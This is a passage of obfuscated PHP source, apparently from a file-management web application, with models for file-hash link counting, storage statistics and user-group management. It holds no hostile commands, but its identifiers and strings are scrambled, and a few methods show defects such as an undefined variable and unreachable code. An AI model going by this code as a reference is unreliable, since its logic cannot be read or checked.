$ˆÊœ²¦õ[924] => $Ó’†…£È[$ˆÊœ²¦õ[487]], $ˆÊœ²¦õ[518] => $ºç¿ã³û, $ˆÊœ²¦õ[2201] => $”Ã„ğúş, $ˆÊœ²¦õ[2202] => $¼½åéÀÇ); return $©¼—²ò‹; } public function addFileCheckExist($¹ûÀ¹ÊÆ, $¢§ëéñá, $ß°áÏòø) { $Ç°Ú«àÇ =& $_SERVER[”øäÃÍª]; $öùÙ˜ª° = $this->findByHash($¹ûÀ¹ÊÆ, $¢§ëéñá); if (!$öùÙ˜ª°) { return !1; } $Œ½‰èï› = array($Ç°Ú«àÇ[2200] => intval($öùÙ˜ª°[$Ç°Ú«àÇ[2207]]) + 1, $Ç°Ú«àÇ[648] => $ß°áÏòø); $this->where(array($Ç°Ú«àÇ[566] => $öùÙ˜ª°[$Ç°Ú«àÇ[565]]))->save($Œ½‰èï›); return $öùÙ˜ª°; } public function remove($äûØåë“) { $this->linkCountChange($äûØåë“, !1); $this->clearEmpty(); return !0; } public function linkAdd($Íº”¦²) { $this->linkCountChange($Íº”¦², !0); } public function linkCountChange($ş˜¹éğå, $¿Ü§šÓ¹) { $ºÁá—÷ =& $_SERVER[”øäÃÍª]; if (!$ş˜¹éğå) { return; } if (!is_array($ş˜¹éğå)) { $ş˜¹éğå = array($ş˜¹éğå); } $² ÅÆ™ï = array(); foreach ($ş˜¹éğå as $“¶éÍ¶) { $Õ®İ‰¬§ = $“¶éÍ¶ . $ºÁá—÷[12]; if (!$² ÅÆ™ï[$Õ®İ‰¬§]) { $² ÅÆ™ï[$Õ®İ‰¬§] = 0; } $² ÅÆ™ï[$Õ®İ‰¬§]++; } $÷ôÇ„¬è = array(); foreach ($² ÅÆ™ï as $“¶éÍ¶ => $Š¾åöÙ¯) { $Õ®İ‰¬§ = $Š¾åöÙ¯ . $ºÁá—÷[12]; if (!$÷ôÇ„¬è[$Õ®İ‰¬§]) { $÷ôÇ„¬è[$Õ®İ‰¬§] = array(); } $÷ôÇ„¬è[$Õ®İ‰¬§][] = $“¶éÍ¶; } foreach ($÷ôÇ„¬è as $Š¾åöÙ¯ => $€–¾±±„) { if (!$€–¾±±„) { continue; } $Š¾åöÙ¯ = $¿Ü§šÓ¹ ? $Š¾åöÙ¯ : -intval($Š¾åöÙ¯); $ˆ»ÎÜË² = array($ºÁá—÷[565] => array($ºÁá—÷[7], $€–¾±±„)); if ($Š¾åöÙ¯ < 0) { $ˆ»ÎÜË²[$ºÁá—÷[2207]] = array($ºÁá—÷[1137], abs($Š¾åöÙ¯)); } $this->where($ˆ»ÎÜË²)->setAdd($ºÁá—÷[2207], $Š¾åöÙ¯); } } public function findByHash($øåÜö·À, $¾Íñ‘Åä = false) { $î¢×ª­Ò =& $_SERVER[”øäÃÍª]; if (!$øåÜö·À && !$¾Íñ‘Åä) { return !1; } $âù£œ®ì = array($î¢×ª­Ò[2201] => $øåÜö·À); if ($¾Íñ‘Åä) { $âù£œ®ì = array($î¢×ª­Ò[2202] => $¾Íñ‘Åä); } return $this->order($î¢×ª­Ò[2208])->where($âù£œ®ì)->find(); } public function clearEmpty($î³ÙÖÏÜ = 1) { $ÎÓ¦‹Æ¢ =& $_SERVER[”øäÃÍª]; $ñÖò´‚¦ = time() - 3600 * 24 * $î³ÙÖÏÜ; $ƒ´úÕ” = $ÎÓ¦‹Æ¢[2209] . $ñÖò´‚¦; $ø„õÍğ‰ = $this->where($ƒ´úÕ”)->select(); if (!$ø„õÍğ‰) { return; } $Î¾‡ÄÏİ = new Task($ÎÓ¦‹Æ¢[2210], $ÎÓ¦‹Æ¢[12], count($ø„õÍğ‰)); foreach ($ø„õÍğ‰ as $©ü•áÂ) { $Î¾‡ÄÏİ->update(1); $this->resetFile($©ü•áÂ); } $Î¾‡ÄÏİ->end(); } public function resetFile($ÄÓ–´ª„) { $Ø­†Õ´ş =& $_SERVER[”øäÃÍª]; $£“ñ“´ = array($Ø­†Õ´ş[566] => $ÄÓ–´ª„[$Ø­†Õ´ş[565]]); $±æíäÈı = Model($Ø­†Õ´ş[1488])->where($£“ñ“´)->count(); $ô‡³æ¨ = Model($Ø­†Õ´ş[2211])->where($£“ñ“´)->count(); $”§à¥Šˆ = intval($±æíäÈı) + intval($ô‡³æ¨); if ($”§à¥Šˆ == 0) { Model($Ø­†Õ´ş[2212])->delete($ÄÓ–´ª„[$Ø­†Õ´ş[565]]); $this->where($£“ñ“´)->delete(); $this->metaSet($ÄÓ–´ª„[$Ø­†Õ´ş[565]], null, null); if (!IO::isFile($ÄÓ–´ª„[$Ø­†Õ´ş[87]])) { write_log(array($Ø­†Õ´ş[2213], ACTION, $ÄÓ–´ª„), $Ø­†Õ´ş[1323]); return !1; } IO::remove($ÄÓ–´ª„[$Ø­†Õ´ş[87]]); write_log(ACTION . $Ø­†Õ´ş[949] . KodUser::id() . $Ø­†Õ´ş[2214] . $ÄÓ–´ª„[$Ø­†Õ´ş[565]] . $Ø­†Õ´ş[2003] . $ÄÓ–´ª„[$Ø­†Õ´ş[79]] . $Ø­†Õ´ş[199] . $ÄÓ–´ª„[$Ø­†Õ´ş[87]], $Ø­†Õ´ş[2213]); return; } if ($ÄÓ–´ª„[$Ø­†Õ´ş[2207]] != $”§à¥Šˆ) { $this->where($£“ñ“´)->save(array($Ø­†Õ´ş[2200] => $”§à¥Šˆ)); } } public function storageInfo($¨ÕÛäú„ = false) { $Ïş¿ƒ¯É =& $_SERVER[”øäÃÍª]; $‘ÇøÛŞ = $this->count() + 0.0; $˜–ÔãÁÜ = 0; $¨‰£§† = 1; $ñË§À—¾ = 0; $ŒÏ©ğéğ = 5000; for ($úê‡ÈŠÆ = 0; $úê‡ÈŠÆ < $‘ÇøÛŞ; $úê‡ÈŠÆ = $úê‡ÈŠÆ + $ŒÏ©ğéğ) { $…Õ¶ÛÇ = $this->limit($úê‡ÈŠÆ, $úê‡ÈŠÆ + $ŒÏ©ğéğ)->select(); foreach ($…Õ¶ÛÇ as $àµÔÎ¸æ) { $¨‰£§† += $àµÔÎ¸æ[$Ïş¿ƒ¯É[79]] * $àµÔÎ¸æ[$Ïş¿ƒ¯É[2207]]; $˜–ÔãÁÜ += $àµÔÎ¸æ[$Ïş¿ƒ¯É[79]] * ($àµÔÎ¸æ[$Ïş¿ƒ¯É[2207]] - 1); $ñË§À—¾ += $àµÔÎ¸æ[$Ïş¿ƒ¯É[2207]]; } } $„»ü­Ó· = array($Ïş¿ƒ¯É[2215] => $¨‰£§†, $Ïş¿ƒ¯É[2216] => $˜–ÔãÁÜ, $Ïş¿ƒ¯É[2217] => $˜–ÔãÁÜ / $¨‰£§†, $Ïş¿ƒ¯É[83] => $‘ÇøÛŞ, $Ïş¿ƒ¯É[2218] => $ñË§À—¾); return $„»ü­Ó·; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\x75\160"; protected $tableMeta = array("\x74\x61\x62\x6c\145\116\141\x6d\x65" => "\147\x72\x6f\x75\x70\x5f\155\145\164\141", "\155\145\164\141\x46\151\145\154\144" => "\147\x72\x6f\x75\x70\111\x44"); protected function cacheFunctionAlias($ı¢õœ¿‰) { $ƒâĞ—Ù¼ =& $_SERVER[”øäÃÍª]; return array($ƒâĞ—Ù¼[2219] => array($ı¢õœ¿‰[0], $ƒâĞ—Ù¼[2220]), $ƒâĞ—Ù¼[2221] => array($ı¢õœ¿‰[0], $ƒâĞ—Ù¼[2222])); } protected function ___getInfo($ŞÔÃƒˆ£) { $†ç‚§Ë£ = $this->getInfoSimple($ŞÔÃƒˆ£); if (!$†ç‚§Ë£) { return !1; } return $this->_listDataApplyItem($†ç‚§Ë£); } protected function ___getInfoSimple($­›­Ú÷) { $˜ä¾Ú²­ = array($_SERVER[”øäÃÍª][1450] => intval($­›­Ú÷)); $ÇœŒ›¬Â = $this->where($˜ä¾Ú²­)->find(); return is_array($ÇœŒ›¬Â) ? $ÇœŒ›¬Â : array(); } protected function groupAdd($Äû ¼Äó) { $¿Øîğı =& $_SERVER[”øäÃÍª]; if (!$Äû ¼Äó[$¿Øîğı[190]] && isset($Äû ¼Äó[$¿Øîğı[1450]]) && $Äû ¼Äó[$¿Øîğı[1450]] == 1) { if ($ç–¹õª = $this->getInfoSimple($Äû ¼Äó[$¿Øîğı[1450]], !0)) { return $Äû ¼Äó[$¿Øîğı[1450]]; } } else { $ç–¹õª = $this->getInfoSimple($Äû ¼Äó[$¿Øîğı[190]]); if (!$ç–¹õª) { return !1; } } $×åˆ²Ÿü = $¿Øîğı[621]; if ($ç–¹õª[$¿Øîğı[612]]) { $×åˆ²Ÿü = $ç–¹õª[$¿Øîğı[612]] . $ç–¹õª[$¿Øîğı[1450]] . $¿Øîğı[50]; } $ùë ßÖ = array($¿Øîğı[517] => $this->groupNameAuto($Äû ¼Äó[$¿Øîğı[190]], $Äû ¼Äó[$¿Øîğı[32]]), $¿Øîğı[500] => $Äû ¼Äó[$¿Øîğı[190]], $¿Øîğı[682] => $×åˆ²Ÿü, $¿Øîğı[2223] => $Äû ¼Äó[$¿Øîğı[2127]], $¿Øîğı[2224] => 0, $¿Øîğı[2144] => 0); $Äû ¼Äó[$¿Øîğı[32]] = $ùë ßÖ[$¿Øîğı[32]]; if (isset($Äû ¼Äó[$¿Øîğı[2162]])) { $ùë ßÖ[$¿Øîğı[2162]] = $Äû ¼Äó[$¿Øîğı[2162]]; } else { $ŸúŒ¨å¿ = $this->max($¿Øîğı[2162]); if (!$ŸúŒ¨å¿) { $ŸúŒ¨å¿ = 0; } $ùë ßÖ[$¿Øîğı[2162]] = $ŸúŒ¨å¿ + 1; } if (!empty($Äû ¼Äó[$¿Øîğı[1450]])) { $ùë ßÖ[$¿Øîğı[1450]] = $Äû ¼Äó[$¿Øîğı[1450]]; } $Ó±ê‡—ì = $this->add($ùë ßÖ); $this->groupMetaEdit($Ó±ê‡—ì, $Äû ¼Äó); Model($¿Øîğı[1488])->groupRootAdd($Ó±ê‡—ì); $this->_clearCache($Äû ¼Äó[$¿Øîğı[190]]); return $Ó±ê‡—ì; } protected function groupEdit($€µ¶ÖÀ¿, $ùã£‹ÊÑ) { $ÓŸ‰´ =& $_SERVER[”øäÃÍª]; $÷¸ºªÂØ = $this->getInfoSimple($€µ¶ÖÀ¿); if (!$÷¸ºªÂØ) { return !1; } if (!empty($ùã£‹ÊÑ[$ÓŸ‰´[190]])) { $ÒñË±ùí = $this->getInfoSimple($ùã£‹ÊÑ[$ÓŸ‰´[190]]); if (!$ÒñË±ùí) { return !1; } if ($÷¸ºªÂØ[$ÓŸ‰´[1450]] == $ÒñË±ùí[$ÓŸ‰´[1450]]) { return !1; } if ($ùã£‹ÊÑ[$ÓŸ‰´[190]] != $÷¸ºªÂØ[$ÓŸ‰´[190]]) { if ($ÒñË±ùí[$ÓŸ‰´[612]] !== $÷¸ºªÂØ[$ÓŸ‰´[612]] && strpos($ÒñË±ùí[$ÓŸ‰´[612]], $÷¸ºªÂØ[$ÓŸ‰´[612]] . $÷¸ºªÂØ[$ÓŸ‰´[1450]] . $ÓŸ‰´[50]) === 0) { return !1; } $ùã£‹ÊÑ[$ÓŸ‰´[682]] = $ÒñË±ùí[$ÓŸ‰´[612]] . $ùã£‹ÊÑ[$ÓŸ‰´[190]] . $ÓŸ‰´[50]; $this->_changeChildLevel($÷¸ºªÂØ, $ÒñË±ùí); $this->_clearCache($ÒñË±ùí[$ÓŸ‰´[1450]]); $this->_clearCache($÷¸ºªÂØ[$ÓŸ‰´[190]]); } } $this->groupMetaEdit($€µ¶ÖÀ¿, $ùã£‹ÊÑ); $this->_clearChildrenCache($÷¸ºªÂØ); return $this->where(array($ÓŸ‰´[2225] => $€µ¶ÖÀ¿))->save($ùã£‹ÊÑ); } private function groupMetaEdit($Ü’ª ûš, &$°À²ÉüÃ) { $´½‘³ü =& $_SERVER[”øäÃÍª]; if (isset($°À²ÉüÃ[$´½‘³ü[32]])) { $this->setNamePinyin($Ü’ª ûš, $°À²ÉüÃ[$´½‘³ü[32]]); } if (isset($°À²ÉüÃ[$´½‘³ü[2226]])) { $˜¯¯ôè = array($´½‘³ü[2226] => $°À²ÉüÃ[$´½‘³ü[2226]], $´½‘³ü[2227] => $°À²ÉüÃ[$´½‘³ü[2227]]); unset($°À²ÉüÃ[$´½‘³ü[2226]]); unset($°À²ÉüÃ[$´½‘³ü[2227]]); if (isset($°À²ÉüÃ[$´½‘³ü[2228]])) { $õÂ¬Îè = $´½‘³ü[1446] . $Ü’ª ûš; $œÌª°‚˜ = $´½‘³ü[1445]; $€¯¢†ø = $°À²ÉüÃ[$´½‘³ü[2228]] ? $°À²ÉüÃ[$´½‘³ü[2228]] : $´½‘³ü[12]; $¬Ù„ùà = Model($´½‘³ü[1444])->get($õÂ¬Îè, $œÌª°‚˜); $¬Ù„ùà = $¬Ù„ùà ? $¬Ù„ùà : $´½‘³ü[12]; if ($¬Ù„ùà != $€¯¢†ø) { if (!$€¯¢†ø && $¬Ù„ùà) { Model($´½‘³ü[1444])->remove($õÂ¬Îè, $œÌª°‚˜); } else { if ($€¯¢†ø) { Model($´½‘³ü[1444])->set($õÂ¬Îè, $€¯¢†ø, $œÌª°‚˜); } } } $˜¯¯ôè[$´½‘³ü[2228]] = $€¯¢†ø; } $this->metaSet($Ü’ª ûš, $˜¯¯ôè); } } private function _clearChildrenCache($¦Ø¿şòñ) { $¦ŠÜ¥­î =& $_SERVER[”øäÃÍª]; $æû¸¦à³ = array($¦ŠÜ¥­î[682] => array($¦ŠÜ¥­î[643], $¦Ø¿şòñ[$¦ŠÜ¥­î[612]] . $¦Ø¿şòñ[$¦ŠÜ¥­î[1450]] . $¦ŠÜ¥­î[644])); $Ùâ¤§êÌ = $this->field($¦ŠÜ¥­î[1450])->where($æû¸¦à³)->select(); foreach ($Ùâ¤§êÌ as $éİ¸®§Õ) { $this->_clearCache($éİ¸®§Õ[$¦ŠÜ¥­î[1450]]); } } private function _clearCache($Èíó¶”İ) { $çØ°ÜØå =& $_SERVER[”øäÃÍª]; $this->cacheFunctionClear($çØ°ÜØå[2229], $Èíó¶”İ); $this->cacheFunctionClear($çØ°ÜØå[2230], $Èíó¶”İ); } private function _changeChildLevel($Õé³Õô, $¡°ã¦°, $ûÛ”Öï = false) { $¾ØÆêù– =& $_SERVER[”øäÃÍª]; $«ÑÂ†’î = $Õé³Õô[$¾ØÆêù–[612]] . $Õé³Õô[$¾ØÆêù–[1450]] . $¾ØÆêù–[50]; $Úä€¿Ã = $¡°ã¦°[$¾ØÆêù–[612]] . $¡°ã¦°[$¾ØÆêù–[1450]] . $¾ØÆêù–[50] . $Õé³Õô[$¾ØÆêù–[1450]] . $¾ØÆêù–[50]; if ($ûÛ”Öï) { $Úä€¿Ã = $¡°ã¦°[$¾ØÆêù–[612]] . $¡°ã¦°[$¾ØÆêù–[1450]] . $¾ØÆêù–[50]; } $Ëæò±®İ = array($¾ØÆêù–[682] => array($¾ØÆêù–[643], $Õé³Õô[$¾ØÆêù–[612]] . $Õé³Õô[$¾ØÆêù–[1450]] . $¾ØÆêù–[644])); $„Ñ‹š¬ = array($¾ØÆêù–[682] => array($¾ØÆêù–[691], "\162\145\x70\154\141\143\x65\50\x70\141\162\x65\156\x74\x4c\x65\166\x65\x6c\54\47{$«ÑÂ†’î}\47\54\47{$Úä€¿Ã}\x27\x29")); $this->_clearChildrenCache($Õé³Õô); $this->where($Ëæò±®İ)->data($„Ñ‹š¬)->save(); } public function setNamePinyin($À¸â¼ø, $ç¢»¢€ˆ = false) { $ù–½‡¨¶ =& $_SERVER[”øäÃÍª]; if (!$ç¢»¢€ˆ) { $¢™«À¶Ç = $this->getInfoSimple($À¸â¼ø); $ç¢»¢€ˆ = $¢™«À¶Ç[$ù–½‡¨¶[32]]; } if (!Input::check($ç¢»¢€ˆ, $ù–½‡¨¶[685])) { $this->metaSet($À¸â¼ø, $ù–½‡¨¶[560], null); $this->metaSet($À¸â¼ø, $ù–½‡¨¶[559], null); return; } $ğË®¥®— = array($ù–½‡¨¶[560] => str_replace($ù–½‡¨¶[53], $ù–½‡¨¶[12], Pinyin::get($ç¢»¢€ˆ)), $ù–½‡¨¶[559] => Pinyin::get($ç¢»¢€ˆ, $ù–½‡¨¶[686])); $this->metaSet($À¸â¼ø, $ğË®¥®—); } protected function metaSet($Šğ„â”, $ôôïÁÊğ = null, $ñÓÄğÆ = null) { $this->_clearCache($Šğ„â”); return parent::metaSet($Šğ„â”, $ôôïÁÊğ, $ñÓÄğÆ); } protected function groupStatus($òÖ¦Ûå, $ÜŒ‡ø©·) { $õ•˜æ—Ğ =& $_SERVER[”øäÃÍª]; $÷š°¸ = $this->getInfoSimple($òÖ¦Ûå); if (!$÷š°¸) { return !1; } $this->_clearCache($òÖ¦Ûå); return $this->metaSet($òÖ¦Ûå, $õ•˜æ—Ğ[859], $ÜŒ‡ø©·); if ($ÜŒ‡ø©· == $õ•˜æ—Ğ[91]) { $å¡Ç¢É = $this->parentLevelArray($÷š°¸[$õ•˜æ—Ğ[612]]); } else { } $å¡Ç¢É[] = $÷š°¸[$õ•˜æ—Ğ[1450]]; $´¾Ş¢é = array(); foreach ($å¡Ç¢É as $òÖ¦Ûå) { $´¾Ş¢é[] = array($õ•˜æ—Ğ[1450] => $òÖ¦Ûå, $õ•˜æ—Ğ[95] => $õ•˜æ—Ğ[859], $õ•˜æ—Ğ[451] => $ÜŒ‡ø©·); $this->_clearCache($òÖ¦Ûå); } return Model($õ•˜æ—Ğ[2231])->addAll($´¾Ş¢é, array(), !0); } protected function groupRemove($¯¥âÓÍé, $ª¬ñÀµ = false) { $ˆäÌšá• =& $_SERVER[”øäÃÍª]; $ú¢Ú·ÌÔ = array($ˆäÌšá•[1450] => $¯¥âÓÍé); $ÏÖøÅü– = $this->where($ú¢Ú·ÌÔ)->find(); if (!$ÏÖøÅü– || $ÏÖøÅü–[$ˆäÌšá•[190]] == 0) { return !1; } if (!$ª¬ñÀµ) { $Ä·ØØ†º = $this->getInfoSimple($ÏÖøÅü–[$ˆäÌšá•[190]]); $this->_changeChildLevel($ÏÖøÅü–, $Ä·ØØ†º, !0); $this->where(array($ˆäÌšá•[190] => $¯¥âÓÍé))->save(array($ˆäÌšá•[190] => $ÏÖøÅü–[$ˆäÌšá•[190]])); $this->_clearCache($Ä·ØØ†º[$ˆäÌšá•[1450]]); } Model($ˆäÌšá•[2231])->where($ú¢Ú·ÌÔ)->delete(); Model($ˆäÌšá•[2232])->where($ú¢Ú·ÌÔ)->delete(); Model($ˆäÌšá•[941])->groupRootRemove($¯¥âÓÍé); $this->_clearCache($ÏÖøÅü–[$ˆäÌšá•[190]]); return $this->where($ú¢Ú·ÌÔ)->delete(); } protected function groupSort($Œö”áæ›) { $¥ÁÁ•·´ =& $_SERVER[”øäÃÍª]; $Ş‡š„„÷ = array(); foreach ($Œö”áæ› as $Ö·Á×Æ => $£„¯åÓì) { $Ş‡š„„÷[] = array($¥ÁÁ•·´[1450], $£„¯åÓì, $¥ÁÁ•·´[2162], $Ö·Á×Æ + 1); } $this->saveAll($Ş‡š„„÷); } public function listData() { $œµ÷¼ß§ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($œµ÷¼ß§[$_SERVER[”øäÃÍª][446]]); return $œµ÷¼ß§; } private function _makeOrder($íÏß×¾ = '') { $ÒŞ¤½üÅ =& $_SERVER[”øäÃÍª]; $²ûÃë‘ä = array($ÒŞ¤½üÅ[1450], $ÒŞ¤½üÅ[32], $ÒŞ¤½üÅ[2129], $ÒŞ¤½üÅ[231]); $“ôâß¦’ = array($ÒŞ¤½üÅ[545] => $ÒŞ¤½üÅ[546], $ÒŞ¤½üÅ[547] => $ÒŞ¤½üÅ[548]); $¡íºÉö‹ = Input::get($ÒŞ¤½üÅ[552], $ÒŞ¤½üÅ[7], $ÒŞ¤½üÅ[2144], $²ûÃë‘ä); $°üÉ° = Input::get($ÒŞ¤½üÅ[553], $ÒŞ¤½üÅ[7], $ÒŞ¤½üÅ[2233], array($ÒŞ¤½üÅ[2233], $ÒŞ¤½üÅ[547])); $°üÉ° = $“ôâß¦’[$°üÉ°]; $íÏß×¾ = $íÏß×¾ . "{$¡íºÉö‹}\x20{$°üÉ°}\54\x20\147\162\157\165\x70\x49\104\x20\141\x73\x63"; return $this->order($íÏß×¾); } public function listChild($ë›¯åùÖ) { $×‚ŠÈ÷‘ =& $_SERVER[”øäÃÍª]; $ÕĞ÷Éšø = $this->where(array($×‚ŠÈ÷‘[190] => $ë›¯åùÖ))->_makeOrder()->selectPage(200); $this->_listDataApply($ÕĞ÷Éšø[$×‚ŠÈ÷‘[446]]); return $ÕĞ÷Éšø; } public function listChildIds($×ˆ üŞ¨) { $Íú¸€¿è =& $_SERVER[”øäÃÍª]; if (is_string($¿½åïş¾)) { $×ˆ üŞ¨ = explode($Íú¸€¿è[50], $×ˆ üŞ¨); } $—±İÑÕ´ = $this->where(array($Íú¸€¿è[1450] => array($Íú¸€¿è[7], $×ˆ üŞ¨)))->field($Íú¸€¿è[2234])->select(); if (!$—±İÑÕ´) { return !1; } $”ßª ßÁ = array(); foreach ($—±İÑÕ´ as $Ä©©ÇÃ—) { $”ßª ßÁ[] = "\163\x65\154\145\x63\164\40\147\x72\157\165\x70\111\104\40\x66\162\157\155\x20\x60\x67\162\157\165\160\140\40\167\150\x65\x72\145\40\x70\141\x72\145\x6e\x74\x4c\145\x76\x65\x6c\40\154\x69\x6b\145\40\x27{$Ä©©ÇÃ—[$Íú¸€¿è[612]]}{$Ä©©ÇÃ—[$Íú¸€¿è[1450]]}\54\x25\x27"; } $”ßª ßÁ = implode($Íú¸€¿è[2235], $”ßª ßÁ); $—±İÑÕ´ = $this->query($”ßª ßÁ); if (!$—±İÑÕ´) { return array(); } $×ˆ üŞ¨ = array_to_keyvalue($—±İÑÕ´, $Íú¸€¿è[12], $Íú¸€¿è[1450]); return array_unique($×ˆ üŞ¨); } public function listByID($ÑÅÃ¢Õ–) { $ß½ ±Ëü =& $_SERVER[”øäÃÍª]; if (!$ÑÅÃ¢Õ–) { return array(); } $À‰¢Á¯à = array($ß½ ±Ëü[1450] => array($ß½ ±Ëü[7], $ÑÅÃ¢Õ–)); $Ø…ŞÍ¾¡ = $this->where($À‰¢Á¯à)->select(); $Ø…ŞÍ¾¡ = array_sort_keep($Ø…ŞÍ¾¡, $ß½ ±Ëü[1450], $ÑÅÃ¢Õ–); $this->_listDataApply($Ø…ŞÍ¾¡); return $Ø…ŞÍ¾¡; } public function listSearch($™Ï®§µ¿) { $ñ¨¿ã×² =& $_SERVER[”øäÃÍª]; $ ÀÏÙ¨‘ = trim($™Ï®§µ¿[$ñ¨¿ã×²[2236]]); $¥±´Ï‡ô = explode($ñ¨¿ã×²[53], $ ÀÏÙ¨‘); if (!$ ÀÏÙ¨‘ || count($¥±´Ï‡ô) == 1) { return $this->listSearchNow($™Ï®§µ¿); } $’•—ê• = array($ñ¨¿ã×²[446] => array()); foreach ($¥±´Ï‡ô as $èÒ±ƒ¥Ò) { if (!trim($èÒ±ƒ¥Ò)) { continue; } $™Ï®§µ¿[$ñ¨¿ã×²[2236]] = $èÒ±ƒ¥Ò; $ØÀÛ¥Î­ = $this->listSearchNow($™Ï®§µ¿); $’•—ê•[$ñ¨¿ã×²[446]] = array_merge($’•—ê•[$ñ¨¿ã×²[446]], $ØÀÛ¥Î­[$ñ¨¿ã×²[446]]); } $’•—ê•[$ñ¨¿ã×²[446]] = array_unique_by_key($’•—ê•[$ñ¨¿ã×²[446]], $ñ¨¿ã×²[1450]); $’•—ê•[$ñ¨¿ã×²[443]] = array($ñ¨¿ã×²[444] => count($’•—ê•[$ñ¨¿ã×²[446]]), $ñ¨¿ã×²[439] => 20, $ñ¨¿ã×²[428] => 1, $ñ¨¿ã×²[445] => 1); return $’•—ê•; } public function listSearchNow($„ÃÃçĞß) { $Ì·â÷¸ =& $_SERVER[”øäÃÍª]; $ñßöêÍí = trim($„ÃÃçĞß[$Ì·â÷¸[2236]]); $Ú´ğ¹¥ = isset($„ÃÃçĞß[$Ì·â÷¸[2237]]) ? $„ÃÃçĞß[$Ì·â÷¸[2237]] : !1; if (!trim($ñßöêÍí)) { return !1; } $ñßöêÍí = str_replace($Ì·â÷¸[2238], $Ì·â÷¸[2239], $ñßöêÍí); $º»øúÒ¼ = array($Ì·â÷¸[1450] => array($Ì·â÷¸[473], "{$ñßöêÍí}\45"), $Ì·â÷¸[32] => array($Ì·â÷¸[473], "\45{$ñßöêÍí}\x25"), $Ì·â÷¸[1122] => $Ì·â÷¸[2240]); if ($Ú´ğ¹¥) { $‘â¹ùèÂ = $this->getInfoSimple($Ú´ğ¹¥); $ê•ˆšêş = $‘â¹ùèÂ[$Ì·â÷¸[612]] . $Ú´ğ¹¥ . $Ì·â÷¸[644]; $º»øúÒ¼ = array($º»øúÒ¼, array($Ì·â÷¸[612] => array($Ì·â÷¸[473], $ê•ˆšêş))); } $º»øúÒ¼ = $this->parseWhereLike($º»øúÒ¼); $Ô¿ıı‘Œ = $this->_makeOrder()->where($º»øúÒ¼)->selectPage(20); $Ô¿ıı‘Œ = $Ô¿ıı‘Œ ? $Ô¿ıı‘Œ : array($Ì·â÷¸[446] => array(), $Ì·â÷¸[443] => array()); if (!$Ô¿ıı‘Œ || count($Ô¿ıı‘Œ[$Ì·â÷¸[446]]) < 5 && Input::check($ñßöêÍí, $Ì·â÷¸[393])) { $õÒ¡Ï÷â = $this->groupChildrenAll($Ú´ğ¹¥); $ÚïÑÖ§¦ = $this->_searchFromMeta($Ì·â÷¸[559], $ñßöêÍí, 10, $õÒ¡Ï÷â); $‰¸¹°‘ı = $this->_searchFromMeta($Ì·â÷¸[560], $ñßöêÍí, 10, $õÒ¡Ï÷â); $•Œ´á·È = array_merge($ÚïÑÖ§¦, $‰¸¹°‘ı, $Ô¿ıı‘Œ[$Ì·â÷¸[446]]); $Ô¿ıı‘Œ[$Ì·â÷¸[446]] = array_unique_by_key($•Œ´á·È, $Ì·â÷¸[1450]); $Ô¿ıı‘Œ[$Ì·â÷¸[443]][$Ì·â÷¸[444]] = count($Ô¿ıı‘Œ[$Ì·â÷¸[446]]); $Ô¿ıı‘Œ[$Ì·â÷¸[443]][$Ì·â÷¸[445]] = ceil($Ô¿ıı‘Œ[$Ì·â÷¸[443]][$Ì·â÷¸[444]] / $Ô¿ıı‘Œ[$Ì·â÷¸[443]][$Ì·â÷¸[439]]); } $this->_listDataApply($Ô¿ıı‘Œ[$Ì·â÷¸[446]]); return $Ô¿ıı‘Œ; } protected function groupChildrenAll($¤ôıŞ¬) { $“í´¨­÷ =& $_SERVER[”øäÃÍª]; if (!$¤ôıŞ¬) { return !1; } if (!is_array($¤ôıŞ¬)) { $¤ôıŞ¬ = array($¤ôıŞ¬); } $Ñû¿û­ˆ = $¤ôıŞ¬; foreach ($¤ôıŞ¬ as $ ü¯òõÅ) { $é‰É¿‡™ = $this->getInfoSimple($ ü¯òõÅ); $õ“¤ÔÄÏ = array($“í´¨­÷[612] => array($“í´¨­÷[473], $é‰É¿‡™[$“í´¨­÷[612]] . $ ü¯òõÅ . $“í´¨­÷[644])); $Û¤Ãû©ö = $this->field($“í´¨­÷[1450])->where($õ“¤ÔÄÏ)->select(); $Ñû¿û­ˆ = array_merge($Ñû¿û­ˆ, array_to_keyvalue($Û¤Ãû©ö, $“í´¨­÷[12], $“í´¨­÷[1450])); } return array_unique($Ñû¿û­ˆ); } private function _searchFromMeta($ÔåŸ×ûË, $ƒÉ—™ã, $‰†ûŞú¿, $³ñò„) { $ÉìÄâ¬ø =& $_SERVER[”øäÃÍª]; $ƒÉ—™ã = strtolower($ƒÉ—™ã); $‚ÈÈáå— = array($ÉìÄâ¬ø[95] => $ÔåŸ×ûË, $ÉìÄâ¬ø[451] => array($ÉìÄâ¬ø[473], "\45{$ƒÉ—™ã}\45")); $‚ÈÈáå— = $this->parseWhereLike($‚ÈÈáå—); if ($³ñò„) { $‚ÈÈáå—[$ÉìÄâ¬ø[1450]] = array($ÉìÄâ¬ø[7], $³ñò„); } $¹ÕºîĞã = Model($ÉìÄâ¬ø[2241])->where($‚ÈÈáå—)->limit($‰†ûŞú¿)->select(); if (!$¹ÕºîĞã) { return array(); } $¹ÕºîĞã = array_to_keyvalue($¹ÕºîĞã, $ÉìÄâ¬ø[12], $ÉìÄâ¬ø[1450]); $Ü§’ûšÇ = $this->where(array($ÉìÄâ¬ø[2225] => array($ÉìÄâ¬ø[7], $¹ÕºîĞã)))->select(); if (!$Ü§’ûšÇ) { return array(); } return $Ü§’ûšÇ; } protected function _listDataApplyItem($‰Ïê€¤¥) { $Š‰óÙÂ¯ = array($‰Ïê€¤¥); $this->_listDataApply($Š‰óÙÂ¯); return $Š‰óÙÂ¯[0]; } protected function _listDataApply(&$–ŸÃğüø) { $ŸÜî¢ğ =& $_SERVER[”øäÃÍª]; if (!$–ŸÃğüø) { return; } $æ£àœÕé = array_to_keyvalue($–ŸÃğüø, $ŸÜî¢ğ[12], $ŸÜî¢ğ[1450]); $this->_listAppendChildren($–ŸÃğüø); $this->_listAppendChildrenMember($–ŸÃğüø); $this->_listAppendMeta($–ŸÃğüø, $æ£àœÕé); $this->_listAppendParent($–ŸÃğüø); $this->_listAppendSourceRoot($–ŸÃğüø, $æ£àœÕé); } private function _listAppendChildren(&$ÃåÓ²…Ş) { $­Ïàîà =& $_SERVER[”øäÃÍª]; $ıªİÓ»’ = array_to_keyvalue($ÃåÓ²…Ş, $­Ïàîà[12], $­Ïàîà[1450]); $æÀöòó = array($­Ïàîà[190] => array($­Ïàîà[7], $ıªİÓ»’)); $•ñŠåÜ¦ = array($­Ïàîà[190], $­Ïàîà[2242] => $­Ïàîà[593]); $½ÌßØ€¯ 